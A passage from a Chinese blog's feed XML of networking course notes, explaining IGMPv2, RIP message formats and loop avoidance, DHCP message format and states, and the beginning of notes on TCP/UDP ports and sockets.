title="IGMPv2报文格式："></a>IGMPv2报文格式：</h4><img src=".\IGMP\IGMPv2报文格式.png" style="zoom:67%;" /><ol><li><p>类型:定义了IGMP报文类型</p><img src=".\IGMP\IGMP报文类型.png" style="zoom: 80%;" /></li><li><p>响应时间:规定查询必须在多长时间内回答，以十分之一秒为单位。默认值为10秒。在查询报文中，这个值不为0，在其它报文中此字段值为0</p></li><li><p>检验和:对整个IGMP报文进行检验，算法同IP数据报</p></li><li><p>组地址:在一般查询报文中值为0。在特殊的查询报文、成员关系报告报文以及退出报文中值为相应的多播组地址</p></li></ol><h4 id="IGMP的封装"><a href="#IGMP的封装" class="headerlink" title="IGMP的封装"></a>IGMP的封装</h4><p>IGMP报文被封装在IP数据报中，IP层有3个字段需要注意:</p><blockquote><ul><li>协议类型:值为2，高层协议类型为2的IP数据包，其数据部分要交给IGMP协议处理。</li><li>生存时间:值为1，保证了这个报文不离开这个局域网。因为IGMP的作用范围是局域网，IGMP报文不能够发送到局域网以外的地方。</li><li>目的IP地址:为D类组播地址。</li></ul></blockquote><h3 id="多播组成员的加入和退出："><a href="#多播组成员的加入和退出：" class="headerlink" title="多播组成员的加入和退出："></a>多播组成员的加入和退出：</h3><h4 id="加入一个组"><a href="#加入一个组" class="headerlink" title="加入一个组"></a>加入一个组</h4><p>每个主机维护一张成员关系表，成员关系表是**&lt;进程名，组名&gt;<strong>表项的集合。当一个进程P要加入一个新组MG时，就向主机发出申请，主机就在成员关系表中增加</strong>&lt;P, MG&gt;**表项。</p><blockquote><ul><li>如果MG在表中不存在，主机就发送成员关系报告报文</li><li>如果MG在表中已经存在，那就不必发送成员关系报告报文，因为主机已经是MG这个组的成员了</li></ul></blockquote><img src=".\IGMP\加入多播组.png" style="zoom:67%;" /><p>路由器也维护一个多播地址表，给出了连接到每一个接口的成员关系。如果对于这些接口中的一个组有兴趣时，路由器就发送成员关系报告报文，以记录连接在它的接口上的所有的多播组。<br>IGMP协议要求把成员关系报告报文在很短的时间内发送两次。这样，如果第一个报文丢失或受到损伤，那么第二个报文可以代替它。</p><h4 id="退出一个组"><a href="#退出一个组" class="headerlink" title="退出一个组"></a>退出一个组</h4><ol><li><p>当主机发现在一个群组MG中已经没有进程时，就发送退出报告报文，多播路由器收到该报告。当路由器发现在一个特定组中已经没有连接在它的接口上感兴趣的网络，它就发送退出这个组的报告。</p></li><li><p>多播路由器收到退出报告报文时，并不立即删除这个群组MG，而是发送针对MG的查询报文，因为这个退出群组报告仅仅是从一个站点发送来的，可能还有其他站点仍然需要这个群组。</p></li><li><p>若在指定时间内没有收到站点对该群组的成员关系报告，就意味着在本网络上没有这个群组MG的成员，删除这个群组。</p><img src=".\IGMP\退出多播组.png" style="zoom:67%;" /></li></ol><h4 id="监视组成员关系"><a href="#监视组成员关系" class="headerlink" title="监视组成员关系"></a>监视组成员关系</h4><blockquote><ul><li>当仅有一台主机留在一个组中时，如果这台主机离开了这个组而没有发送退出报告报文，那么多播路由器将永远收不到退出报告报文，它认为这个组一直存在这个成员。</li></ul></blockquote><p>多播路由器负责监视局域网上的所有主机或路由器,多播路由器周期性地发送<strong>一般查询报文</strong>，在这个报文中，组地址被置为<strong>0.0.0.0</strong>。</p><p>路由器期望着在它的组表中的每一个组的回答，甚至新的组也可以回答。查询报文的最大响应时间是10秒。当主机路由器收到一般查询报文时，如果它对一个组感兴趣，就发送成员关系报告报文。</p><h4 id="延迟响应"><a href="#延迟响应" class="headerlink" title="延迟响应"></a>延迟响应</h4><blockquote><p style="color:blue;">IGMP使用延迟响应策略，避免不必要的通信量。当主机或路由器收到查询报文时，它不是立即响应，而是延迟响应</p></blockquote><p>主机或路由器使用一个随机数产生计时器，它的截止时间是1～10秒。截止时间可以使用1秒或更短的步长。</p><p>表中的每一个组都设置计时器。每个主机或路由器在发送成员关系报告报文之前都要等待它的计时器到时。在这段等待时间中，如果在同一组中的其它主机或路由器的计时器先到了截止时间，那么这个主机或路由器就发送成员关系报告报文。因为这个报文是广播发送的，等待的主机或路由器都能收到这个报文，并知道没有必要对这个组发送重复的报文;因此，等待的主机或路由器就取消发送成员关系报告。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Internet组管理协议IGMP&quot;&gt;&lt;a href=&quot;#Internet组管理协议IGMP&quot; class=&quot;headerlink&quot; title=&quot;Internet组管理协议IGMP&quot;&gt;&lt;/a&gt;Internet组管理协议IGMP&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>路由信息协议RIP</title>
    <link href="https://shierjinghuang.github.io/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/"/>
    <id>https://shierjinghuang.github.io/2022/11/15/%E8%B7%AF%E7%94%B1%E4%BF%A1%E6%81%AF%E5%8D%8F%E8%AE%AE/</id>
    <published>2022-11-15T14:13:20.000Z</published>
    <updated>2025-03-27T09:51:31.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="路由信息协议RIP"><a href="#路由信息协议RIP" class="headerlink" title="路由信息协议RIP"></a>路由信息协议RIP</h2><p>[TOC]</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握路由协议的分类，理解静态路由和动态路由</span><span class="token comment">#掌握动态路由协议RIP的报文格式、工作原理及工作过程</span><span class="token comment">#掌握RIP计时器的作用</span><span class="token comment">#理解RIP的稳定性</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="一、路由分类："><a href="#一、路由分类：" class="headerlink" title="一、路由分类："></a>一、路由分类：</h3><h4 id="静态路由与动态路由："><a href="#静态路由与动态路由：" class="headerlink" title="静态路由与动态路由："></a>静态路由与动态路由：</h4><h5 id="路由选择"><a href="#路由选择" class="headerlink" title="路由选择:"></a>路由选择:</h5><blockquote><p>在从源点到终点的通信过程中，数据包可能经过多个路由器，直到到达连接，目的网络路由器为止。<br>当路由器收到数据包时，它应当将数据包转发到哪一个网络，取决于路由表的信息。</p></blockquote><h5 id="路由表"><a href="#路由表" class="headerlink" title="路由表:"></a>路由表:</h5><blockquote><p>静态路由表:路由信息是管理员设置的，并由管理员手动进行更新。</p></blockquote><blockquote><p>动态路由表:路由信息是随着互联网的变化而自动更新的。</p></blockquote><p>**路由选择协议:**路由选择协议是一些规则和过程的组合。规则使得路由器之间能够共享他们所知道的互联网情况和邻站信息，而过程用来合并从其它路由器收到的信息。</p><h4 id="外部和内部路由选择："><a href="#外部和内部路由选择：" class="headerlink" title="外部和内部路由选择："></a>外部和内部路由选择：</h4><p><strong>自治系统（AS,Autonomous System)</strong><br>由同一个管理机构管理、使用统一路由策略的路由器的集合。<br>最初，自治系统内部只考虑运行单个路由协议;然而，随着网络的发展，一个自治系统内现在也可以支持同时运行多种路由协议</p><img src=".\路由信息协议\自治系统.png" style="zoom:67%;" /><h5 id="两大类路由选择协议"><a href="#两大类路由选择协议" class="headerlink" title="两大类路由选择协议"></a>两大类路由选择协议</h5><p><strong>内部网关协议IGP(Interior Gateway Protocol)：</strong></p><blockquote><p style="color:blue;">内部网关协议IGP(Interior Gateway Protocol):在一个自治系统内部使用的路由选择协议</p>- 目前这类路由选择(域内路由选择)协议使用得最多，如**RIP**和**OSPF协议**。</blockquote><p><strong>外部网关协议EGP(External Gateway Protocol):</strong></p><blockquote><p style="color:blue;">外部网关协议EGP(External Gateway Protocol):在自治系统之间使用的路由选择协议</p>- 在外部网关协议中目前使用最多的是**BGP-4**协议</blockquote><h5 id="距离向量路由选择协议"><a href="#距离向量路由选择协议" class="headerlink" title="距离向量路由选择协议:"></a>距离向量路由选择协议:</h5><ol><li>从路由器到直接连接的网络的距离定义为1</li><li>从路由器到非直接连接的网络的距离定义为所经过的路由器数加1，因此也称为“跳数”</li><li>每个节点维护一个到其它节点的最小距离向量表</li><li>初始状态下，每个节点只知道到与它直接相连的节点的代价</li><li>节点周期性地向其所有相邻节点发送它的路由表信息</li><li>当一个节点从邻站收到路由表信息时，使用<strong>Bellman-Ford算法</strong>更新其路由表</li></ol><h3 id="二、RIP协议："><a href="#二、RIP协议：" class="headerlink" title="二、RIP协议："></a>二、RIP协议：</h3><h4 id="2-1：路由信息协议-Routing-Information-Protocol"><a href="#2-1：路由信息协议-Routing-Information-Protocol" class="headerlink" title="2.1：路由信息协议(Routing Information Protocol)"></a>2.1：路由信息协议(Routing Information Protocol)</h4><p>应用较早、使用较普遍的<strong>内部网关协议</strong>，适用于小型同类网络，是典型的<strong>距离向量路由协议</strong>。</p><blockquote><ul><li><p style="color:orange;">通过广播UDP协议520端口封装成的报文来交换路由信息，默认每30秒发送一次路由信息更新报文</p></li><li><p style="color:orange;">RIP使用跳数作为路由距离度量，即数据报到达目标设备所必须经过的路由器数目</p></li><li><p style="color:orange;">RIP最多支持的跳数为15，跳数16表示不可达</p></li></ul></blockquote><h5 id="RIP的工作原理"><a href="#RIP的工作原理" class="headerlink" title="RIP的工作原理"></a>RIP的工作原理</h5><ol><li>路由器启动时，路由表中只包含直通路由。运行RIP后，路由器会发送Request报文，用来请求邻居路由器的RIP路由</li><li>运行RIP的邻居路由器收到该Request报文后，会根据自己的路由表，生成Response报文进行回复</li><li>路由器在收到Response报文后，会将相应的路由添加到自己的路由表中</li><li>RIP网络稳定以后，每个路由器会<strong>周期性</strong>的向<strong>邻居路由器</strong>通稿自己的<strong>整张路由表</strong>中的路由信息，默认周期为30秒。邻居路由器根据收到的路由信息刷新自己的路由表</li><li>路由表中的每一路由项都对应了一个老化定时器，当路由项在180秒内没有任何更新时，定时器超时，该路由项的度量值变为不可达</li><li>某路由项的度量值变为不可达后，该路由会在Response报文中发布四次(120秒)，然后从路由表中清除。</li></ol><h5 id="RIP协议的特点"><a href="#RIP协议的特点" class="headerlink" title="RIP协议的特点"></a>RIP协议的特点</h5><p>仅和相邻路由器交换信息。</p><pre class="line-numbers language-none"><code class="language-none">交换的信息是当前本路由器所知道的全部信息，即自己的路由表按固定的时间间隔交换路由信息<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="RIPv1-vs-RIPv2"><a href="#RIPv1-vs-RIPv2" class="headerlink" title="RIPv1 vs RIPv2"></a>RIPv1 vs RIPv2</h5><p><strong>RIPv1</strong></p><blockquote><p style="color:orange;">有类别路由协议，不支持VLSM和CIDR且不支持认证。以广播的形式发送报文，目的IP地址为广播地址255.255.255.255</p></blockquote><p><strong>RIPv2</strong></p><blockquote><p style="color:orange;">无类别路由协议，支持VLSM、路由聚合与CIDR，支持明文认证和MD5密文认证，以广播或者组播(224.0.0.9)方式发送报文</p></blockquote><h4 id="2-2：RIP协议报文格式："><a href="#2-2：RIP协议报文格式：" class="headerlink" title="2.2：RIP协议报文格式："></a>2.2：RIP协议报文格式：</h4><h5 id="RIPv1的报文格式："><a href="#RIPv1的报文格式：" class="headerlink" title="RIPv1的报文格式："></a>RIPv1的报文格式：</h5><img src=".\路由信息协议\RIPv1的报文格式.png" style="zoom:67%;" /><p> 每个字段的值和作用</p><blockquote><p>Command:表示该报文是一个请求报文还是响应报文，1表示该报文是请求报文，2表示该报文是响应报文</p><p>Version:表示RIP的版本信息。对于RIPv1，该字段的值为1</p><p>Address Family ldentifier (AFI):表示地址标识信息，对于IP协议，其值为2</p><p>lP address:表示该路由条目的目的IP地址。这一项可以是网络地址、主机地址</p><p>Metric:路由条目的度量值，取值范围1-16。</p></blockquote><blockquote><p style="color:blue;">一个RIP路由更新消息中最多可包含25条路由表项，每个路由表项都携带了目的网络的地址和度量值。整个RIP报文大小限制为不超过504字节，如果整个路由表的更新消息超过该大小，需要发送多个RIPv1报文</p></blockquote><h5 id="RIPv2的报文格式："><a href="#RIPv2的报文格式：" class="headerlink" title="RIPv2的报文格式："></a>RIPv2的报文格式：</h5><img src=".\路由信息协议\RIPv2的报文格式.png" style="zoom: 50%;" /><p><strong>RIPv1与RIPv2的不同的字段</strong></p><blockquote><p>AFI:地址族标识除了表示支持的协议类型外，还可以用来描述认证信息<br>Route tag:用于标记外部路由。<br>Subnet Mask:指定IP地址的子网掩码，定义IP地址的网络或子网部分<br>Next Hop:指定通往目的地址的下—跳IP地址。</p></blockquote><h3 id="三、RIP环路："><a href="#三、RIP环路：" class="headerlink" title="三、RIP环路："></a>三、RIP环路：</h3><p>RIP网络正常运行时，RTA会通过RTB学习到10.0.0.0/8网络的路由，度量值为1。一旦路由器RTB的直连网络10.0.0.0/8产生故障，RTB会立即检测到该故障，并认为该路由不可达。此时，RTA还没有收到该路由不可达的信息，于是会继续向RTB发送通往10.0.0.0/8的路由信息。RTB会学习此路由信息，认为可以通过RTA到达10.0.0.0/8网络，度量值为2。<br>此后，RTB发送的更新路由表，又会导致RTA路由表的更新，RTA会新增一条度量值为3的10.0.0.0/8网络路由表项，从而形成路由环路。这个过程会持续下去，直到度量值为16。</p><h4 id="环路避免-水平分割"><a href="#环路避免-水平分割" class="headerlink" title="环路避免-水平分割"></a>环路避免-水平分割</h4><p>路由器从某个接口学到的路由，不会从该接口再发回给邻居路由器。</p><blockquote><p>RTA从RTB学习到的10.0.0.0/8网络的路由不会再从RTA的接收接口重新通告给RTB，由此避免了路由环路的产生。</p></blockquote><img src=".\路由信息协议\水平分割.png" style="zoom:67%;" /><h4 id="环路避免-毒性反转"><a href="#环路避免-毒性反转" class="headerlink" title="环路避免-毒性反转"></a>环路避免-毒性反转</h4><p>毒性反转机制的实现可以使错误路由立即超时。<br>毒性反转是指路由器从某个接口学到路由后，将该路由的跳数设置为16，并从原接收接口发回给邻居路由器</p><img src=".\路由信息协议\毒性反转.png" style="zoom:67%;" /><h4 id="环路避免-触发更新"><a href="#环路避免-触发更新" class="headerlink" title="环路避免-触发更新"></a>环路避免-触发更新</h4><p style="color:skyblue;">触发更新是指当路由信息发生变化时，立即向邻居设备发送触发更新报文，而不需要等待更新定时器超时，从而加速了网络收敛</p><img src=".\路由信息协议\触发更新.png" style="zoom:67%;" />]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;路由信息协议RIP&quot;&gt;&lt;a href=&quot;#路由信息协议RIP&quot; class=&quot;headerlink&quot; title=&quot;路由信息协议RIP&quot;&gt;&lt;/a&gt;路由信息协议RIP&lt;/h2&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;pre class=&quot;line-numbers languag</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>动态主机配置协议DHCP</title>
    <link href="https://shierjinghuang.github.io/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/"/>
    <id>https://shierjinghuang.github.io/2022/11/14/%E5%8A%A8%E6%80%81%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE%E5%8D%8F%E8%AE%AEDHCP/</id>
    <published>2022-11-14T13:40:20.000Z</published>
    <updated>2025-03-27T09:42:10.429Z</updated>
    
    <content type="html"><![CDATA[<h3 id="动态主机配置协议DHCP"><a href="#动态主机配置协议DHCP" class="headerlink" title="动态主机配置协议DHCP"></a>动态主机配置协议DHCP</h3><p>[TOC]</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">#掌握DHCP的报文格式</span><span class="token comment">#掌握DHCP的工作原理</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="DHCP简介："><a href="#DHCP简介：" class="headerlink" title="DHCP简介："></a>DHCP简介：</h4><blockquote><p style="color:blue;">动态主机配置协议(Dynamic Host Configuration Protocol )是一种动态指定IP地址的机制</p></blockquote><ul><li>DHCP服务器能自动为客户端分配IP地址，减少了客户机IP地址配置的复杂度和管理开销</li><li><strong>DHCP服务器</strong>是安装了DHCP服务器软件的计算机，可在网络中设置一台或多台</li></ul><p>分配给客户的IP是临时的，DHCP客户只能在有限的时间内使用该IP，这段时间称为<strong>租用期</strong><br>租用期的数值应由DHCP服务器决定(默认1小时)，DHCP客户也可在自己发送的报文中提出对租用期的要求。<br>当租期到了的时候，服务器可以把这个IP地址分配给别的主机使用。</p><blockquote><p style="color:orange;">DHCP使用UDP协议封装，使用UDP的熟知端口67和68，68是DHCP请求报文中的源端口，67是DHCP服务器的目标端口</p></blockquote><h4 id="DHCP报文格式："><a href="#DHCP报文格式：" class="headerlink" title="DHCP报文格式："></a>DHCP报文格式：</h4><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP报文格式.png" style="zoom:50%;" /><blockquote><ol><li>操作码:1字节，表示是请求报文还是应答报文，1代表请求，2代表应答</li><li>硬件类型:1字节，表示正在使用的硬件技术的类型，1表示以太网。</li><li>硬件地址长度:1字节，如果是以太网，该字段值为6。</li><li>跳数:1字节，表示报文经过的DHCP中继的数目，请求报文每经过一个DHCP中继，该字段就加1。</li><li>事务ID:4字节，客户端发起一次请求时选择的随机数，服务器应答时返回客户同一个值，用来标识一次地址请求交互过程。</li><li>秒数:2字节，表示从客户端发出DHCP请求到现在所经过的秒数。</li><li>标志:2字节，第一个比特为广播响应标识位，用来标识dhcp服务器响应报文是采用单播还是广播发送。其余比特保留不用。</li><li>客户IP:4字节，如果客户已知道自己的IP，就写入，否则填入0。</li><li>你的IP:4字节，服务器分配给客户的IP。</li><li>服务器IP:4字节，由服务器填写，DHCP服务器的IP。</li><li>DHCP中继IP:4字节，客户发出请求后报文经过的第一个DHCP中继的IP。客户硬件地址:16字节，由客户端设置。</li><li>服务器主机名:64字节，由服务器填写。</li><li>引导文件名:由服务器为客户指定的配置文件名称。</li><li>选项:可选选项字段，包含报文的类型、有效租期、DNS服务器的IP地址、wins服务器的IP地址等配置信息，格式如下:</li></ol></blockquote><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP协议封装.png" style="zoom:67%;" /><h4 id="静态地址分配与动态地址分配："><a href="#静态地址分配与动态地址分配：" class="headerlink" title="静态地址分配与动态地址分配："></a>静态地址分配与动态地址分配：</h4><h5 id="静态地址分配"><a href="#静态地址分配" class="headerlink" title="静态地址分配"></a>静态地址分配</h5><blockquote><p style="color:blue;">将物理地址与IP地址绑定在一起，DHCP服务器将这个绑定文件存放在静态数据库中。</p><p style="color:blue;">当有主机请求分配IP时，DHCP服务器首先检查静态数据库，若静态数据库存在所请求的物理地址条目，则将相应的IP地址返回给客户。</p></blockquote><h5 id="动态地址分配"><a href="#动态地址分配" class="headerlink" title="动态地址分配"></a>动态地址分配</h5><p>DHCP服务器有一个<strong>存放IP地址的数据库</strong>(IP地址池)。当客户请求临时IP地址时，DHCP服务器就查找可用的IP地址分配给客户。</p><blockquote><p style="color:orange;">从DHCP服务器获得的IP地址是临时的，服务器预设了租用时间，租用时间到期时，客户就更新租用或停止使用这个IP地址。</p></blockquote><p>服务器对更新租用可选择同意或不同意，如果不同意，客户就停止使用这个地址。</p><h4 id="DHCP状态转换"><a href="#DHCP状态转换" class="headerlink" title="DHCP状态转换"></a>DHCP状态转换</h4><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP状态转换.png" style="zoom: 50%;" /><p><strong>一、初始化状态：</strong></p><ul><li>当DHCP客户端首次启动时，它处于初始化状态。客户使用向UDP端口67<strong>广播DHCPDISCOVER报文</strong>（带有DHCPDISCOVER选项的请求报文)。</li></ul><p><strong>二、选择状态：</strong></p><ul><li>发送DHCPDISCOVER报文后，客户就进入<strong>选择状态</strong>。收到请求报文的服务器用<strong>DHCPOFFER报文</strong>进行响应，提供了IP地址和租用时间，同时，服务器把提供的IP地址锁定，使这个地址不再提供给其它客户。</li><li>如果客户没有收到DHCPOFFER报文，它就再尝试4次，每次间隔2s，如果仍然没有应答，客户就睡眠300s后再试 </li></ul><p><strong>三、 请求状态 ：</strong></p><ul><li>客户选择多个DHCP服务器所提供的地址中的一个，并广播发送<strong>DHCPREQUEST报文</strong>，然后进入请求状态。</li><li>客户在请求状态等待，直到收到服务器的DHCPACK报文，然后客户进入绑定状态。 </li></ul><p><strong>四、绑定状态：</strong></p><ul><li>绑定状态下，客户在租用时间到期之前可以使用这个IP地址。当租用时间到达<strong>50%<strong>时，客户发送另一个DHCPREQUEST报文请求更新，进入</strong>更新状态</strong>。</li><li>在绑定状态，客户也可以使用<strong>DHCPRELEASE</strong>报文取消租用，进入初始化状态。</li></ul><p><strong>五、更新状态：</strong></p><ul><li><p>在更新状态下，如果客户收到更新租用的DHCPACK报文，就把计时器复位，然后回到绑定状态。</p></li><li><p>如果没有收到DHCPACK报文，且租用时间已到达87.5%，客户将再次向服务器发送DHCPREQUEST报文，进入重新绑定状态。 </p></li></ul><h4 id="DHCP运行过程"><a href="#DHCP运行过程" class="headerlink" title="DHCP运行过程"></a>DHCP运行过程</h4><p><strong>一、发现阶段：</strong></p><ul><li>DHCP客户寻找DHCP服务器的阶段。DHCP客户以广播方式发送DHCPDISCOVER报文来寻找DHCP服务器。</li></ul><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP发现阶段.png" style="zoom:67%;" /><p><strong>二、提供阶段：</strong></p><ul><li><p>服务器向DHCP客户提供lP地址的阶段。网络中收到<strong>DHCPDISCOVER</strong>的DHCP服务器都会做出响应，从尚未出租的IP中挑选一个分配给客户，向客户发送一个包含出租的IP地址和其它设置的<strong>DHCPOFFER</strong>报文。</p><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP提供阶段.png" style="zoom:67%;" /></li></ul><p><strong>三、选择阶段：</strong></p><ul><li><p>DHCP客户端选择某台DHCP服务器提供的IP地址的阶段。</p></li><li><p>如果有多台DHCP服务器向DHCP客户端发来的DHCPOFFER提供报文，则DHCP客户只接受第一个收到的DHCPOFFER提供报文，然后它就以广播方式回答一个DHCPREQUEST请求报文，该报文中包含向它所选定的DHCP服务器请求IP地址的内容。之所以要以广播方式回答，是为了通知所有的DHCP服务器，他将选择某台DHCP服务器所提供的IP地址。</p><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP选择阶段.png" style="zoom: 80%;" /></li></ul><p><strong>四、确认阶段：</strong></p><ul><li><p>DHCP服务器确认所提供的IP地址的阶段</p></li><li><p>当DHCP服务器收到DHCP客户回答的DHCPREQUEST请求报文之后，它便向DHCP客户发送一个包含它所提供的IP地址和其它设置的DHCPACK确认报文，告诉DHCP客户可以使用它所提供的IP地址。然后DHCP客户便将其TCP/IP协议与网卡绑定，另外，除DHCP客户选中的服务器外，其它DHCP服务器都收回曾提供的IP地址</p><img src="D:\blog\shierjinghuang\source\_posts\动态主机配置协议DHCP\DHCP确认阶段.png" style="zoom:80%;" /></li></ul><p><strong>五、重新登录：</strong></p><ul><li>以后DHCP客户每次重新登录网络时，就不需要再发送DHCPDISCOVER报文了，而是直接发送含有前一次所分配的IP地址的DHCPREQUEST请求报文。当服务器收到这一报文后，它会尝试让客户继续使用原来的IP地址，并回答一个DHCPACK确认报文。</li><li>如果此IP地址已无法再分配给原来的客户时，服务器给客户回答一个DHCPNACK否认报文。原来的客户收到否认报文后，必须重新发送DHCPDISCOVER报文来请求新的IP地址。</li></ul><p><strong>六、更新租约：</strong></p><ul><li>服务器给客户的IP地址有一个租借期限，期满后服务器会收回IP地址。如果客户要延长其IP租约，则必须更新租约。当时间到了租约期限的50%时，客户会自动向服务器发送更新其IP租约的DHCPREQUEST报文。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;动态主机配置协议DHCP&quot;&gt;&lt;a href=&quot;#动态主机配置协议DHCP&quot; class=&quot;headerlink&quot; title=&quot;动态主机配置协议DHCP&quot;&gt;&lt;/a&gt;动态主机配置协议DHCP&lt;/h3&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;pre class=&quot;line-num</summary>
      
    
    
    
    <category term="网络工程相关" scheme="https://shierjinghuang.github.io/categories/%E7%BD%91%E7%BB%9C%E5%B7%A5%E7%A8%8B%E7%9B%B8%E5%85%B3/"/>
    
    
    <category term="网络协议分析" scheme="https://shierjinghuang.github.io/tags/%E7%BD%91%E7%BB%9C%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>传输层协议TCP与UDP</title>
    <link href="https://shierjinghuang.github.io/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/"/>
    <id>https://shierjinghuang.github.io/2022/11/13/%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AEUDP%E4%B8%8ETCP/</id>
    <published>2022-11-13T09:40:20.000Z</published>
    <updated>2025-03-27T09:38:45.593Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="传输层协议TCP与UDP"><a href="#传输层协议TCP与UDP" class="headerlink" title="传输层协议TCP与UDP"></a>传输层协议TCP与UDP</h2><h3 id="进程间通信："><a href="#进程间通信：" class="headerlink" title="进程间通信："></a>进程间通信：</h3><blockquote><p style="color:orange;">点到点的通信:IP协议负责主机到主机的通信。作为网络层协议，IP协议只能把报文交付给目的主机。</p></blockquote><blockquote><p style="color:orange;">端到端的通信：运输层协议负责进程到进程的通信。TCP和UDP协议负责把报文交付到正确的进程。</p></blockquote><img src=".\传输协议UDP与TCP\进程间通信.png" style="zoom:80%;" /><h4 id="端口号"><a href="#端口号" class="headerlink" title="端口号:"></a>端口号:</h4><p>主机是用IP地址来标识的，而要标识主机中的进程，就需要使用端口号。TCP/IP协议族中，端口号占16 bit，用0~65535之间的整数标识。TCP和UDP是两个独立的软件模块，因此各自的端口号也相互独立。·端口号只具有本地意义，不同计算机的相同端口号是没有联系的。</p><h5 id="三类端口号："><a href="#三类端口号：" class="headerlink" title="三类端口号："></a>三类端口号：</h5><ul><li>熟知端口，数值为0~1023，用于标识服务器进程。</li><li>登记端口号，数值为1024~49151，为没有熟知端口号的服务器进程使用。使用这个范围的端口号必须在IANA登记，以防止重复。</li><li>客户端口号或短暂端口号，数值为49152~65535，留给客户进程选择暂时使用，一般由应用程序开发者指定或由操作系统随机分配一个未使用的端口号。当服务器进程收到客户进程的报文时，就知道了客户进程所使用的动态端口号。通信结束后，这个端口号可供其它客户进程使用。</li></ul><h5 id="UDP的熟知端口号："><a href="#UDP的熟知端口号：" class="headerlink" title="UDP的熟知端口号："></a>UDP的熟知端口号：</h5><img src=".\传输协议UDP与TCP\UDP的熟知端口号.png" style="zoom:80%;" /><h5 id="套接字："><a href="#套接字：" class="headerlink" title="套接字："></a>套接字：</h5><p>为了使多主机、多进程通信时不发生混乱，必须把主机的IP地址和端口号结合起来使用，称为<strong>套接字(Socket)</strong>.</p><blockquote><p>客户套接字地址唯一地定义了客户进程;服务器套接字地址唯一地定义了服务器进程;TCP与UDP都使用套接字通信;</p></blockquote><p>套接字包括**IP地址(32位)<strong>和</strong>端口号(16位)**，共48位.进行通信的一对套接字在整个Internet中是唯一的。</p><img src=".\传输协议UDP与TCP\套接字.png"  /><blockquote><p style="color:orange;">面向连接的服务：进行数据交换前，先建立连接，传输结柬后释放连接</p></blockquote><ol><li>建立连接阶段:在有关协议数据单元中，须给出源用户与目的用户的完整地址，同时可协商服务质量等选项。</li><li>数据交换阶段:这个阶段，每个报文中不必包含用户完整的地址，而是使用一个连接标识符来代替。报文的发送和接收都是按顺序进行的，发送方先发送的报文，在接收方先收到。</li><li>释放连接阶段:通过相应的协议数据单元完成释放操作。</li></ol><blockquote><p style="color:orange;">无连接的服务：两个实体通信前不必先建立连接。</p></blockquote><blockquote><p>无连接服务灵活方便，但不能防止报文的丢失、重复和乱序。·每个报文必须包含完整的源地址和目的地址，因此开销较大。</p></blockquote><h3 id="用户数据报协议UDP"><a href="#用户数据报协议UDP" class="headerlink" title="用户数据报协议UDP"></a>用户数据报协议UDP</h3><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握UDP协议的报文格式#掌握UDP协议校验和的计算方法#理解UDP协议的优缺点<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="UDP协议简介："><a href="#UDP协议简介：" class="headerlink" title="UDP协议简介："></a>UDP协议简介：</h4><blockquote><p style="color:blue;">UDP (User Datagram Protocol，用户数据报协议）提供无连接的传输服务，对等的UDP实体在传输时不建立端到端的连接，只是简单地发送或接收数据报</p></blockquote><p>UDP协议直接位于IP协议的上层，属于运输层协议。<br>UDP协议不提供端到端的确认和重传功能，它不保证数据包一定能到达目的地，因此是不可靠协议，使用UDP的程序可根据自己的需求设计相应的可靠性机制，如TFTP。</p><h5 id="UDP协议的特点"><a href="#UDP协议的特点" class="headerlink" 